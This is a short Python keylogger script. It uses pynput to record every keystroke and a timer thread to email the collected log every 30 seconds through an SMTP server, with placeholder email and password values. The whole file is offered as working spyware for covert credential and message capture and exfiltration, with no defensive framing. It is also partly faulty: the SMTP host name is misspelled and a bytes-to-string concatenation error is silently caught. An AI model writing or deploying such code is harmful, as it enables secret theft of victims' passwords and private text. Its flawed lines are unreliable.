import smtplib
import threading
import pynput

log = ""

def callback_function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
        #log = log + str(key)
        print(log)
    except TypeError:
        log = log + str(key)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    print(log)

def send_email(mail_address,password,message):
    email_server = smtplib.SMTP("smthn.gmail.com",587)
    email_server.starttls()
    email_server.login(mail_address,password)
    email_server.sendmail(mail_address,mail_address,message)
    email_server.quit()

#thread - threading

def thread_func():
    global log
    send_email("Enter Your Email", "Enter your Email Passw", log)
    log = ""
    timer_object = threading.Timer(30,thread_func)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_func()
    keylogger_listener.join()

